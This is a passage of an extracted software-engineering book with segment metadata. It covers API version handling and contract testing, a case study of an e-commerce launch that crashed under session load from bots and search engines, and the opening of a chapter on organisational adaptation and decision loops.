missing? You can’t tell the bank if that thing is going to get opened up like a sardine can in the next big blow. Or what if the credit score is missing? Do you still send the application out to your financial partners? Are they going to do a credit score lookup or will they just throw an error at you?\n\nAll these questions need answers. You put some new fields in your request specification, but that doesn’t mean you can assume anyone will obey them.\n\nA parallel problem exists with calls that your service sends out to other ser- vices. Remember that your suppliers can deploy a new version at any time, too. A request that worked just a second ago may fail now.\n\nreport erratum • discuss\n\nChapter 14. Handling Versions • 272\n\nThese problems are another reason I like the contract testing approach from Help Others Handle Your Versions, on page 263. A common failing in integration tests is the desire to overspecify the call to the provider. As shown in the figure, the test does too much. It sets up a request, issues the request, then makes assertions about the response based on the data in the original request. That verifies how the end-to-end loop works right now, but it doesn’t verify that the caller correctly conforms to the contract, nor that the caller can handle any response the supplier is allowed to send. Consequently, some new release in the provider can change the response in an allowed but unexpected way, and the consumer will break.\n\nTestCase\n\nProductionCode\n\nCall with parameters\n\nSet uprequest\n\nReal or MockService\n\nIssue request\n\nResponse\n\nResponse\n\nValidateResponse\n\nIn this style of testing, it can be hard to provoke the provider into giving back error responses too. We often need to resort to special flags that mean “always throw an exception when I give you this parameter.” You just know that, sooner or later, that test code will reach production.\n\nI prefer a style of testing that has each side check its own conformance to the specification. In the figure on page 273, we can see the usual test being split into two different parts.\n\nThe first part just checks that requests are created according to the provider’s requirements. The second part checks that the caller is prepared to handle responses from the provider. Notice that neither of these parts invokes the external service. They are strictly about testing how well our code adheres to the contract. We exercised the contract test before with explicit contract tests that ensure the provider does what it claims to do. Separating the tests into these parts helps isolate breakdowns in communication. It also makes our\n\nreport erratum • discuss\n\nWrapping Up • 273\n\nTestCode\n\nTestCode\n\nProductionCode\n\nCall with parameters\n\nSet uprequest\n\nRequest\n\nValidateRequestRequest Side\n\nProcess response\n\nDo Stuﬀand Things\n\nGenerateFakeResponse\n\nValidate ResultsResponse Side\n\nProductionCode\n\ncode more robust because we no longer make unjustified assumptions about how the other party behaves.\n\nAs always, your software should remain cynical. Even if your most trusted service provider claims to do zero-downtime deployments every time, don’t forget to protect your service. Refer to Chapter 5, Stability Patterns, on page 91, for self-defense techniques.\n\nWrapping Up\n\nLike many places where our software intersects with the external environment, versioning is inherently messy. It will always remain a complex topic. I recom- mend a utilitarian philosophy. The net suffering in your organization is min- imized if everyone thinks globally and acts locally. The alternative is an entire organization slowly grinding to a halt as every individual release gets tied down waiting for synchronized upgrades of its clients.\n\nIn this chapter, we’ve seen how to handle our versions to aid others and how to defend ourselves against version changes in our consumers and providers. Next we look at the operations side of the equation—namely, how to build transparency into our systems and how to adapt when transparency reveals a need for change.\n\nreport erratum • discuss\n\nPart IV\n\nSolve Systemic Problems\n\nCHAPTER 15\n\nCase Study: Trampled by Your Own Customers\n\nAfter years of work, the day of launch finally arrived. I had joined this huge team (more than three hundred in total) nine months earlier to help build a complete replacement for a retailer’s online store, content management, customer service, and order-processing systems. Destined to be the company’s backbone for the next ten years, it was already more than a year late when I joined the team. For the previous nine months, I had been in crunch mode: taking lunches at my desk and working late into the night. A Minnesota winter will test your soul even under the best of times. Dawn rises late, and dusk falls early. None of us had seen the sun for months. It often felt like an inescapable Orwellian nightmare. We had crunched through spring, the only season worth living here for. One night I went to sleep in winter, and the next time I looked around, I realized summer had arrived.\n\nAfter nine months, I was still one of the new guys. Some of the development teams had crunched for more than a year. They had eaten lunches and dinners brought in by the client every day of the week. Even today, some of them still shiver visibly when remembering turkey tacos.\n\nCountdown and Launch\n\nWe’d had at least six different “official” launch dates. Three months of load testing and emergency code changes. Two whole management teams. Three targets for the required user load level (each revised downward).\n\nToday, however, was the day of triumph. All the toil and frustration, the for- gotten friends, and the divorces were going to fade away after we launched.\n\nreport erratum • discuss\n\nChapter 15. Case Study: Trampled by Your Own Customers • 278\n\nThe marketing team—many of whom hadn’t been seen since the last of the requirements-gathering meetings two years earlier—gathered in a grand conference room for the launch ceremony, with champagne to follow. The technologists who had turned their vague and ill-specified dreams into reality gathered around a wall full of laptops and monitors that we set up to watch the health of the site.\n\nAt 9 a.m., the program manager hit the big red button. (He actually had a big red button, which was wired to an LED in the next room, where a techie clicked Reload on the browser being projected on the big screen.) The new site appeared like magic on the big screen in the grand conference room. Where we lurked in our lair on the other side of the floor, we heard the marketers give a great cheer. Corks popped. The new site was live and in production.\n\nOf course, the real change had been initiated by the content delivery network (CDN). A scheduled update to their metadata was set to roll out across their network at 9 a.m. central time. The change would propagate across the CDN’s network of servers, taking about eight minutes to be effective worldwide. We expected to see traffic ramping up on the new servers starting at about 9:05 a.m. (The browser in the conference room was configured to bypass the CDN and hit the site directly, going straight to what the CDN called the “origin servers.” Marketing people aren’t the only ones who know how to engage in smoke and mirrors.) In fact, we could immediately see the new traffic coming into the site.\n\nBy 9:05 a.m., we already had 10,000 sessions active on the servers.\n\nAt 9:10 a.m., more than 50,000 sessions were active on the site.\n\nBy 9:30 a.m., 250,000 sessions were active on the site. Then the site crashed.\n\nWe really put the “bang” in “big bang” release.\n\nAiming for Quality Assurance\n\nTo understand why the site crashed so badly, so quickly, we must take a brief look back at the three years leading up to that point.\n\nIt’s rare to see such a greenfield project, for a number of good reasons. For starters, there’s no such thing as a website project. Every one is really an enterprise integration project with an HTML interface. Most are an API layer over the top of back-end services. This project was in the heyday of the mono- lithic “web site” on a commerce suite. It did 100 percent server-side rendering.\n\nWhen the back end is being developed along with the front end, you might think the result would be a cleaner, better, tighter integration. It’s possible\n\nreport erratum • discuss\n\nAiming for Quality Assurance • 279\n\nthat could happen, but it doesn’t come automatically; it depends on Conway’s law. The more common result is that both sides of the integration end up aiming at a moving target.\n\nConway’s Law\n\nIn a Datamation article in 1968, Melvin Conway described a sociological phenomenon: “Organizations which design systems are constrained to produce designs whose structure are copies of the communication structures of these organizations.” It is sometimes stated colloquially as, “If you have four teams working on a compiler, you will get a four-pass compiler.”\n\nAlthough this sounds like a Dilbert cartoon, it actually stems from a serious, cogent analysis of a particular dynamic that occurs during software design. For an interface to be built within or between systems, Conway argues, two people must—in some fashion—communicate about the specification for that interface. If the communication does not occur, the interface cannot be built.\n\nNote that Conway refers to the “communication structure” of the organization. This is usually not the same as the formal structure of the organization. If two developers embedded in different departments are able to communicate directly, that communi- cation will be mirrored in one or more interfaces within the system.\n\nI’ve since found Conway’s law useful in a proscriptive mode—creating the communi- cation structure that I wanted the software to embody—and in a descriptive mode— mapping the structure of the software to help understand the real communication structure of the organization.\n\nConway’s original article is available on his website.a\n\na.\n\nwww.melconway.com/research/committees.html\n\nReplacing the entire commerce stack at once also brings a significant amount of technical risk. If the system is not built with stability patterns, it probably follows a typical tightly coupled architecture. In such a system, the overall probabil- ity of system failure is the joint probability that any one component fails.\n\nEven if the system is built with the stability patterns (this one wasn’t), a completely new stack means that nobody can be sure how it’ll run in produc- tion. Capacity, stability, control, and adaptability are all giant question marks.\n\nEarly in my time on the project, I realized that the development teams were building everything to pass testing, not to run in production. Across the fifteen applications and more than five hundred integration points, every single config- uration file was written for the integration-testing environment. Hostnames, port numbers, database passwords: all were scattered across thousands of configuration files. Worse yet, some of the components in the applications\n\nreport erratum • discuss",
      "page_number": 274,
      "chapter_number": 34,
      "summary": "This chapter covers segment 34 (pages 274-281). Key topics include versions, version, and request.",
      "keywords": [
        "version",
        "Versions",
        "request",
        "Handle Others’ Versions",
        "service",
        "API version",
        "API",
        "Handle",
        "routes",
        "application",
        "version number",
        "version changes",
        "Handling Versions",
        "borrower",
        "POST"
      ],
      "concepts": [
        "versions",
        "version",
        "request",
        "requester",
        "service",
        "routes",
        "routing",
        "application",
        "applications",
        "likely"
      ],
      "similar_chapters": [
        {
          "book": "Microservice APIs Using Python Flask FastAPI",
          "chapter": 15,
          "title": "Segment 15 (pages 136-143)",
          "relevance_score": 0.74,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservice APIs Using Python Flask FastAPI",
          "chapter": 11,
          "title": "Segment 11 (pages 92-103)",
          "relevance_score": 0.71,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservice APIs Using Python Flask FastAPI",
          "chapter": 1,
          "title": "Segment 1 (pages 1-8)",
          "relevance_score": 0.7,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservice APIs Using Python Flask FastAPI",
          "chapter": 42,
          "title": "Segment 42 (pages 430-440)",
          "relevance_score": 0.65,
          "method": "sentence_transformers"
        },
        {
          "book": "Game Programming Gems 6",
          "chapter": 30,
          "title": "Segment 30 (pages 523-540)",
          "relevance_score": 0.64,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 35,
      "title": "Segment 35 (pages 282-289)",
      "start_page": 282,
      "end_page": 289,
      "detection_method": "topic_boundary",
      "content": "Chapter 15. Case Study: Trampled by Your Own Customers • 280\n\nassumed the QA topology, which we knew would not match the production environment. For example, production would have additional firewalls not present in QA. (This is a common “penny-wise, pound-foolish” decision that saves a few thousand dollars on network gear but costs more in downtime and failed deployments.) Furthermore, in QA, some applications had just one instance that would have several clustered instances in production. In many ways, the testing environment also reflected outdated ideas about the system architecture that everyone “just knew” would be different in production. The barrier to change in the test environment was high enough, however, that most of the development team chose to ignore the discrepancies rather than lose one or two weeks of their daily build-deploy-test cycles.\n\nWhen I started asking about production configurations, I thought it was just a problem of finding the person or people who had already figured these issues out. I asked the question, “What source control repository are the production configurations checked into?” and “Who can tell me what properties need to be overridden in production?”\n\nSometimes when you ask questions but don’t get answers, it means nobody knows the answers. At other times, though, it means nobody wants to be seen answering the questions. On this project, it was some of both. And sometimes when you ask too many questions, you get tagged to answer them.\n\nI decided to compile a list of properties that looked as if they might need to change for production: hostnames, port numbers, URLs, database connection parameters, log file locations, and so on. Then I hounded developers for answers. A property named “host” is ambiguous, especially when the host in QA has five applications on it. It could mean “my own hostname,” it could mean “the host that is allowed to call me,” or it could mean “the host I use to launder money.” Before I could figure out what it should be in production, I had to know which it was.\n\nOnce I had a map of which properties needed to change in production, it was time to start defining the production deployment structure. Thousands of files would need changes to run in production. All of them would be overwritten with each new software release. The idea of manually editing thousands of files, in the middle of the night, for each new release was a nonstarter. In addition, some properties were repeated many, many times. Just changing a database password looked as if it would necessitate editing more than a hundred files across twenty servers, and that problem would only get worse as the site grew.\n\nreport erratum • discuss\n\nLoad Testing • 281\n\nFaced with an intractable problem, I did what any good developer does: I added a level of indirection. (Even though I was in operations, I had been a developer most of my career so I still tended to approach problems with that perspective.) The key was to create a structure of overrides that would remain separate from the application codebase. The overrides would be structured such that each property that varied from one environment to the next existed in exactly one place. Then each new release could be deployed without over- writing the production configuration. These overrides also had the benefit of keeping production database passwords out of the QA environment (which developers could access) and out of the source control system (which anyone in the company could access), thereby protecting our customers’ privacy.\n\nIn setting up the production environment, I had inadvertently volunteered to assist with the load test.\n\nLoad Testing\n\nWith a new, untried system, the client knew that load testing would be critical to a successful launch. The client had budgeted a full month for load testing, longer than I’d ever seen. Before the site could launch, marketing had declared that it must support 25,000 concurrent users.\n\nCounting concurrent users is a misleading way of judging the capacity of the system. If 100 percent of the users are viewing the front page and then leaving, your capacity will be much, much higher than if 100 percent of the users are actually buying something.\n\nYou can’t measure the concurrent users. There’s no long-standing connection, just a series of discrete impulses as requests arrive. The servers receive this sequence of requests that they tie together by some identifier. As shown in the following figure, this series of requests gets identified with a session—an abstraction to make programming applications easier.\n\nFirstRequest\n\nLastRequest\n\nSessionTimeout\n\nDead Time\n\nSession Active\n\nNotice that the user actually goes away at the start of the dead time. The server can’t tell the difference between a user who is never going to click again and one who just hasn’t clicked yet. Therefore, the server applies a timeout.\n\nreport erratum • discuss\n\nChapter 15. Case Study: Trampled by Your Own Customers • 282\n\nIt keeps the session alive for some number of minutes after the user last clicked. That means the session is absolutely guaranteed to last longer than the user. Counting sessions overestimates the number of users, as demon- strated in the next figure.\n\n5 sessions2 userstsessions\n\nWhen you look at all of the active sessions, some of them are destined to expire without another request. The number of active sessions is one of the most important measurements about a web system, but don’t confuse it with counting users.\n\nStill, to reach a target of 25,000 active sessions would take some serious work.\n\nLoad testing is usually a pretty hands-off process. You define a test plan, create some scripts (or let your vendor create the scripts), configure the load generators and test dispatcher, and fire off a test run during the small hours of the night. The next day, after the test is done, you can analyze all the data collected during the test run. You analyze the results, make some code or configuration changes, and schedule another test run.\n\nWe knew that we would need much more rapid turnaround. So, we got a bunch of people on a conference call: the test manager, an engineer from the load test service, an architect from the development team, a DBA to watch database usage, and me (monitoring and analyzing applications and servers).\n\nLoad testing is both an art and a science. It is impossible to duplicate real pro- duction traffic, so you use traffic analysis, experience, and intuition to achieve as close a simulation of reality as possible. You run in a smaller environment and hope that the scaling factors all work out. Traffic analysis gives you nothing but variables: browsing patterns, number of pages per session, conversion rates,\n\nreport erratum • discuss\n\nLoad Testing • 283\n\nthink time distributions, connection speeds, catalog access patterns, and so on. Experience and intuition help you assign importance to different variables. We expected think time, conversion rate, session duration, and catalog access to be the most important drivers. Our first scripts provided a mix of “grazers,” “searchers,” and “buyers.” More than 90 percent of the scripts would view the home page and one product detail page. These represented bargain hunters who hit the site nearly every day. We optimistically assigned 4 percent of the virtual users to go all the way through checkout. On this site, as with most ecommerce sites, checkout is one of the most expensive things you can do. It involves external integrations (CCVS, address normalization, inventory checks, and available-to-purchase checks) and requires more pages than almost any other session. A user who checks out often accesses twelve pages during the session, whereas a user who just scans the site and goes away typically hits no more than seven pages. We believed our mix of virtual users would be slightly harsher on the systems than real-world traffic.\n\nOn the first test run, the test had ramped up to only 1,200 concurrent users when the site got completely locked up. Every single application server had to be restarted. Somehow, we needed to improve capacity by twenty times.\n\nWe were on that conference call twelve hours a day for the next three months, with many interesting adventures along the way. During one memorable evening, the engineer from the load-testing vendor saw all the Windows machines in his load farm start to download and install some piece of software. The machines were being hacked while we were on the call using them to generate load! On another occasion, it appeared that we were hitting a bandwidth ceiling. Sure enough, some AT&T engineer had noticed that one particular subnet was using “too much” bandwidth, so he capped the link that was generating 80 percent of our load. But, aside from the potholes and pitfalls, we also made huge improvements to the site. Every day, we found new bottlenecks and capacity limits. We were able to turn configuration changes around during a single day. Code changes took a little longer, but they still got turned around in two or three days.\n\nWe even accomplished a few major architecture changes in less than a week.\n\nThis early preview of operating the site in production also gave us an oppor- tunity to create scripts, tools, and reports that would soon prove to be vital.\n\nAfter three months of this testing effort and more than sixty new application builds, we had achieved a tenfold increase in site capacity. The site could handle 12,000 active sessions, which we estimated to represent about 10,000 customers at a time (subject to all the caveats about counting customers).\n\nreport erratum • discuss\n\nChapter 15. Case Study: Trampled by Your Own Customers • 284\n\nFurthermore, when stressed over the 12,000 sessions, the site didn’t crash anymore, although it did get a little “flaky.” During these three months, marketing had also reassessed their target for launch. They decided they would rather have a slow site than no site. Instead of 25,000 concurrent users, they thought 12,000 sessions would suffice for launch during the slow part of the year. Everyone expected that we would need to make major improvements before the holiday season.\n\nMurder by the Masses\n\nSo after all that load testing, what happened on the day of the launch? How could the site crash so badly and so fast? Our first thought was that marketing was just way off on their demand estimates. Perhaps the customers had built up anticipation for the new site. That theory died quickly when we found out that customers had never been told the launch date. Maybe there was some misconfiguration or mismatch between production and the test environment?\n\nThe session counts led us almost straight to the problem. It was the number of sessions that killed the site. Sessions are the Achilles’ heel of every appli- cation server. Each session consumes resources, mainly RAM. With session replication enabled (it was), each session gets serialized and transmitted to a session backup server after each page request. That meant the sessions were consuming RAM, CPU, and network bandwidth. Where could all the sessions have come from?\n\nEventually, we realized that noise was our biggest problem. All of our load testing was done with scripts that mimicked real users with real browsers. They went from one page to another linked page. The scripts all used cookies to track sessions. They were polite to the system. In fact, the real world can be rude, crude, and vile.\n\nThings happen in production—bad things that you can’t always predict. One of the difficulties we faced came from search engines. Search engines drove something like 40 percent of visits to the site. Unfortunately, on the day of the switch, they drove customers to old-style URLs. The web servers were configured to send all requests for .html to the application servers (because of the application servers’ ability to track and report on sessions). That meant that each customer coming from a search engine was guaranteed to create a session on the app servers, just to serve up a 404 page.\n\nThe search engines noticed a change on the site, so they started refetching all the cached pages they had. That made a lot of sessions just for 404 traffic. (That’s just one reason not to abandon your old URL structure, of course.\n\nreport erratum • discuss\n\nThe Testing Gap • 285\n\nAnother good reason is that people put links in reviews, blogs, and social media. It really sucks when those all break at once.) We lost a lot of SEO juice that day.\n\nAnother huge issue we found was with search engines spidering the new pages. We found one search engine that was creating up to ten sessions per second. That arose from an application-security team mandate to avoid session cookies and exclusively use query parameters for session IDs. (Refer back to Broken Authentication and Session Management, on page 218, for a reminder about why that was a bad decision.)\n\nThen there were the scrapers and shopbots. We found nearly a dozen high- volume page scrapers. Many of these misbehaving bots were industry-specific search engines for competitive analysis. Some of them were very clever about hiding their origins. One in particular sent page requests from a variety of small subnets to disguise the fact that they were all originating at the same source. In fact, even consecutive requests from the same IP address would use different user-agent strings to mask their true origin. You can forget about robots.txt. First of all, we didn’t have one. Second, the shopbots’ cloaking efforts meant they would never respect it even if we did.\n\nThe American Registry for Internet Numbers (ARIN) can still identify the source IP addresses as belonging to the same entity, though.1 These commercial scrapers actually sell a subscription service. A retailer wanting to keep track of a competitor’s prices can subscribe to a report from one of these outfits. It delivers a weekly or daily report of the competitor’s items and prices. That’s one reason why some sites won’t show you a sale price until you put the item in your cart. Of course, none of these scrapers properly handled cookies, so each of them was creating additional sessions.\n\nFinally, there were the sources that we just called “random weird stuff.” (We didn’t really use the word “stuff.”) For example, one computer on a Navy base would show up as a regular browsing session, and then about fifteen minutes after the last legitimate page request, we’d see the last URL get requested again and again. More sessions. We never did figure out why that happened. We just blocked it. Better to lose that one customer than all the others.\n\nThe Testing Gap\n\nDespite the massive load-testing effort, the system still crashed when it con- fronted the real world. Two things were missing in our testing.\n\n1.\n\nwww.arin.net\n\nreport erratum • discuss\n\nChapter 15. Case Study: Trampled by Your Own Customers • 286\n\nFirst, we tested the application the way it was meant to be used. Test scripts would request one URL, wait for the response, and then request another URL that was present on the response page. None of the load-testing scripts tried hitting the same URL, without using cookies, 100 times per second. If they had, we probably would have called the test “unrealistic” and ignored that the servers crashed. Since the site used only cookies for session tracking, not URL rewriting, all of our load test scripts used cookies.\n\nIn short, all the test scripts obeyed the rules. It would be like an application tester who only ever clicked buttons in the right order. Testers are really more like that joke that goes around on Twitter every once in a while, “Tester walks into a bar. Orders a beer. Orders 0 beers. Orders 99999 beers. Orders a lizard. Orders -1 beers. Orders a sfdeljknesv.” If you tell testers the “happy path” through the application, that’s the last thing they’ll do. It should be the same with load testing. Add noise, create chaos. Noise and chaos might only bleed away some amount of your capacity, but it might also bring your system down.\n\nSecond, the application developers did not build in the kind of safety devices that would cut off bad situations. When something went wrong, the application would keep sending threads into the danger zone. Like a car crash on a foggy freeway, the new request threads would just pile up into the ones that were already broken or hung. We saw this from our very first day of load testing, but we didn’t understand the significance. We thought it was a problem with the test methodology rather than a serious deficiency in the system’s ability to recover from insults.\n\nAftermath\n\nThe grim march in the days and weeks following launch produced impressive improvements. The CDN’s engineers redeemed themselves for their “sneak preview” error before launch. In one day, they used their edge server scripting to help shield the site from some of the worst offenders. They added a gateway page that served three critical capabilities. First, if the requester did not handle cookies properly, the page redirected the browser to a separate page that explained how to enable cookies. Second, we could set a throttle to determine what percentage of new sessions would be allowed. If we set the throttle to 25 percent, then only 25 percent of requests for this gateway page would serve the real home page. The rest of the requests would receive a politely worded message asking them to come back later. Over the next three weeks, we had an engineer watching the session counts at all times, ready to pull back on the throttle anytime the volume appeared to be getting out of hand. If the servers got completely overloaded, it would take nearly an hour\n\nreport erratum • discuss\n\nAftermath • 287\n\nto get back to serving pages, so it was vital to use the throttle to keep them from getting saturated. By the third week, we were able to keep the throttle at 100 percent all day long.\n\nThe third critical capability we added was the ability to block specific IP addresses from hitting the site. Whenever we observed one of the shopbots or request floods, we would add them to the blocked list.\n\nAll those things could’ve been done as part of the application, but in the mad scramble following launch, it was easier and faster to have the CDN handle them for us. We had our own set of rapid changes to pursue.\n\nThe home page was completely dynamically generated, from the JavaScript for the drop-down category menus to the product details and even to the link on the bottom of the page for “terms of use.” One of the application platform’s key selling points was personalization. Marketing was extremely keen on that feature but had not decided how to use it. So this home page being generated and served up five million times a day was exactly the same every single time it got served. There wasn’t even any A/B testing. It also required more than 1,000 database transactions to build the page. (Even if the data was already cached in memory, a transaction was still created because of the way the platform worked.) The drop-down menus with nice rollover effects required traversal of eighty-odd categories. Also, traffic analysis showed that a signifi- cant percentage of visits per day just hit the main page. Most of them didn’t present an identification cookie, so personalization wasn’t even possible. Still, if the application server got involved in sending the home page, it would take time and create a session that would occupy memory for the next thirty minutes. So we quickly built some scripts that would make a static copy of the home page and serve that for any unidentified customers.\n\nHave you ever looked at the legal conditions posted on most commerce sites? They say wonderful things like, “By viewing this page you have already agreed to the following conditions....” It turns out that those conditions exist for one reason. When the retailer discovers a screen scraper or shopbot, they can sic the lawyers on the offending party. We kept the legal team busy those first few days. After we identified another set of illicit bots hitting the site to scrape content or prices, the lawyers would send cease-and-desist notices; most of the time, the bots would stop. They never stayed away for long, though.\n\nThis particular application server’s session failover mechanism was based on serialization. The user’s session remains bound to the original server instance, so all new requests go back to the instance that already has the user’s session in memory. After every page request, the user’s session is serialized and sent\n\nreport erratum • discuss",
      "page_number": 282,
      "chapter_number": 35,
      "summary": "This chapter covers segment 35 (pages 282-289). Key topics include sessions, session, and site. At 9 a.m., the program manager hit the big red button.",
      "keywords": [
        "site",
        "sessions",
        "Load Testing",
        "session",
        "production",
        "Load",
        "users",
        "active sessions",
        "n’t",
        "system",
        "report erratum",
        "servers",
        "report",
        "Customers",
        "Conway"
      ],
      "concepts": [
        "sessions",
        "session",
        "site",
        "servers",
        "pages",
        "report",
        "applications",
        "application",
        "integration",
        "integrations"
      ],
      "similar_chapters": [
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 60,
          "title": "Segment 60 (pages 591-598)",
          "relevance_score": 0.6,
          "method": "sentence_transformers"
        },
        {
          "book": "operating_systems_three_easy_pieces",
          "chapter": 3,
          "title": "Segment 3 (pages 17-24)",
          "relevance_score": 0.58,
          "method": "sentence_transformers"
        },
        {
          "book": "operating_systems_three_easy_pieces",
          "chapter": 25,
          "title": "Segment 25 (pages 231-249)",
          "relevance_score": 0.58,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Machine Learning Systems An Iterative Process for Production-Ready Applications",
          "chapter": 33,
          "title": "Segment 33 (pages 281-289)",
          "relevance_score": 0.57,
          "method": "sentence_transformers"
        },
        {
          "book": "operating_systems_three_easy_pieces",
          "chapter": 30,
          "title": "Segment 30 (pages 294-301)",
          "relevance_score": 0.57,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 36,
      "title": "Segment 36 (pages 290-298)",
      "start_page": 290,
      "end_page": 298,
      "detection_method": "topic_boundary",
      "content": "Chapter 15. Case Study: Trampled by Your Own Customers • 288\n\nover the wire to a “session backup server.” The session backup server keeps the sessions in memory. Should the user’s original instance go down—deliberately or otherwise—the next request gets directed to a new instance, chosen by the load manager. The new instance then attempts to load the user’s session from the session backup server. Normally the session only includes small data, usually just keys such as the user’s ID, her shopping cart ID, and maybe some information about her current search. It would not be a good idea to put the entire shopping cart in the session in serialized form, or the entire contents of the user’s last search result. Sadly, that’s exactly what we found in the ses- sions. Not only the whole shopping cart, but up to 500 results from the user’s last keyword search, too. We had no choice but to turn off session failover.\n\nAll these rapid response actions share some common themes. First, nothing is as permanent as a temporary fix. Most of these remained in place for mul- tiple years. (The longest of them—rolling restarts—lasted a decade and kept going through more than 100 percent turnover in the team.) Second, they all cost a tremendous amount of money, mainly in terms of lost revenue. Clearly, customers who get throttled away from the site are less likely to place an order. (At least, they are less likely to place an order at this site.) Without session failover, any user in the middle of checking out would not be able to finish when that instance went down. Instead of getting an order confirmation page, for example, they would get sent back to their shopping cart page. Most customers who got sent back to their cart page, when they’d been partway through the checkout process, just went away. Wouldn’t you? The static home page made personalization difficult, even though it’d been one of the original goals of the whole rearchitecture project. The direct cost of doubling the application server hardware is obvious, but it also brought added operational costs in labor and licenses. Finally, there was the opportunity cost of spending the next year in remediation projects instead of rolling out new, revenue- generating features.\n\nThe worst part is that no amount of those losses was necessary. Two years after the site launched, it could handle more than four times the load on fewer servers of the same original model. The software has improved that much. If the site had originally been built the way it is now, the engineers would have been able to join marketing’s party and pop a few champagne corks instead of popping fuses.\n\nreport erratum • discuss\n\nCHAPTER 16\n\nAdaptation\n\nChange is guaranteed. Survival is not.\n\nYou’ve heard the Silicon Valley mantras: “Software is eating the world.” “You’re either disrupting the market or you’re going to be disrupted.” “Move fast and break things.” What do they all have in common? A total focus on change, either on the ability to withstand change or, better yet, the ability to create change.\n\nThe agile development movement embraced change in response to business conditions. These days, however, the arrow is just as likely to point in the other direction. Software change can create new products and markets. It can open up space for new alliances and new competition, creating surface area between businesses that used to be in different industries—like light bulb manufacturers running server-side software on a retailer’s cloud com- puting infrastructure.\n\nSometimes the competition isn’t another firm but yesterday’s version of the product, as in the startup realm. You launch your minimum viable product, hoping to learn fast, release fast, and find that crucial product-market fit before the cash runs out.\n\nIn all these cases, we need adaptation. That is the theme we will explore in this chapter. Our path touches people, processes, tools, and designs. And as you might expect, these interrelate. You’ll need to introduce them in parallel and incrementally.\n\nConvex Returns\n\nNot every piece of software needs to mutate daily. Some pieces of software truly have no upside potential to rapid change and adaptation. In some industries, every release of software goes through expensive, time-consuming\n\nreport erratum • discuss\n\nChapter 16. Adaptation • 290\n\ncertification. Avionics and implantable medical devices come to mind. That creates inescapable overhead to cutting a release—a transaction cost. If you have to launch astronauts into orbit armed with a screwdriver and a chip- puller, then you have some serious transaction costs to work around.\n\nOf course, you can find exceptions to every rule. JPL deployed a hotfix to the Spirit rover on Mars;1 and when Curiosity landed on Mars, it didn’t even have the software for ground operations. That was loaded after touchdown when all the code for interplanetary flight and landing could be evicted. They were stuck with the hardware they launched, though. No in-flight upgrades to the RAM!\n\nRapid adaptation works when there’s a convex relationship between effort and return. Competitive markets usually exhibit such convexities.\n\nProcess and Organization\n\nTo make a change, your company has to go through a decision cycle, as illustrated in the figure that follows. Someone must sense that a need exists. Someone must decide that a feature will fit that need and that it’s worth doing...and how quickly it’s worth doing. And then someone must act, building the feature and putting it to market. Finally, someone must see whether the change had the expected effect, and then the process starts over. In a small company, this decision loop might involve just one or two people. Communi- cation can be pretty fast, often just the time it takes for neurons to fire across the corpus callosum. In a larger company, those responsibilities get diffused and separated. Sometimes an entire committee fills the role of “observer,” “decider,” or “doer.”\n\nPlanDoCheckAct\n\n1.\n\nhttp://www.itworld.com/article/2832818/it-management/the-day-a-software-bug-almost-killed-the-spirit-rover.html\n\nreport erratum • discuss\n\nProcess and Organization • 291\n\nThe time it takes to go all the way around this cycle, from observation to action, is the key constraint on your company’s ability to absorb or create change. You may formalize it as a Deming/Shewhart cycle,2 as illustrated in the previous figure; or an OODA (observe, orient, decide, act) loop,3 as shown in the figure that follows; or you might define a series of market experiments and A/B tests. No matter how you do it, getting around the cycle faster makes you more competitive.\n\nFeedback\n\nUnfoldingCircumstancesOutsideInformationUnfoldingInteractionwith Environment\n\nObservations\n\nFeedForward\n\nFeedForward\n\nDecision(Hypothesis)\n\nAction(Test)\n\nImplicit Guidance and Control\n\nInstinct\n\nCulturalTraditions\n\nAnalysis &Synthesis\n\nNewInformation\n\nPreviousExperience\n\nOrienting\n\nFeedForward\n\nThis need for competitive maneuverability drives the “fail fast” motto for startups. (Though it might be better to describe it as “learn fast” or simply “adapt.”) It spurs large companies to create innovation labs and incubators.\n\nSpeed up your decision loop and you can react faster. But just reacting isn’t the goal! Keep accelerating and you’ll soon be able to run your decision loop faster than your competitors. That’s when you force them to react to you. That’s when you’ve gotten “inside their decision loop.”\n\nAgile and lean development methods helped remove delay from the “act” portion of the decision loop. DevOps helps remove even more delay in “act” and offers tons of new tools to help with “observe.” But we need to start the timer when the initial observations are made, not when the story lands in the backlog. Much time passes silently before a feature gets that far. The next great frontier is in the “deciding” phase.\n\n2. 3.\n\nhttps://en.wikipedia.org/wiki/PDCA\n\nhttps://en.wikipedia.org/wiki/OODA_loop\n\nreport erratum • discuss\n\nChapter 16. Adaptation • 292\n\nThe Danger of Thrashing\n\nThrashing happens when your organization changes direction without taking the time to receive, process, and incorporate feedback. You may recognize it as constantly shifting development priorities or an unending series of crises.\n\nWe constantly encourage people to shorten cycle time and reduce the time between sensing and acting. But be careful not to shorten development cycle time so much that it’s faster than how quickly you get feedback from the environment.\n\nIn aviation, there’s an effect officially called “pilot-induced oscillation” and unofficially called “porpoising.” Suppose a pilot needs to raise the aircraft’s pitch. He pulls back on the stick, but there’s a long delay between when he moves the stick and when the plane moves, so he keeps pulling the stick back. Once the plane does change attitude, the nose goes up too far. So the pilot pushes the stick forward, but the same delay provokes him to overcontrol in the other direction. It’s called “porpoising” because the plane starts to leap up and dive down like a dolphin at SeaWorld. In our industry, “porpoising” is called thrashing. It happens when the feedback from the environment is slower than the rate of control changes. One effort will be partly completed when a whole new direction appears. It creates team confusion, unfinished work, and lost productivity.\n\nTo avoid thrashing, try to create a steady cadence of delivery and feedback. If one runs faster than the other, you could slow it down, but I wouldn’t recommend it! Instead, use the extra time to find ways to speed up the other process. For example, if development moves faster than feedback, don’t use the spare cycles to build dev tools that speed up deployment. Instead, build an experimentation platform to help speed up observation and decisions.\n\nIn the sections that follow, we’ll look at some ways to change the structure of your organization to speed up the decision loop. We’ll also consider some ways to change processes to move from running one giant decision loop to running many of them in parallel. Finally, we’ll consider what happens when you push automation and efficiency too far.\n\nPlatform Team\n\nIn the olden days, a company kept its developers quarantined in one depart- ment. They were well isolated from the serious business of operations. Oper- ations had the people who racked machines, wired networks, and ran the databases and operating systems. Developers worked on applications. Oper- ations worked on the infrastructure.\n\nThe boundaries haven’t just blurred, they’ve been erased and redrawn. That began before we even heard the word “DevOps.” (See The Fallacy of the\n\nreport erratum 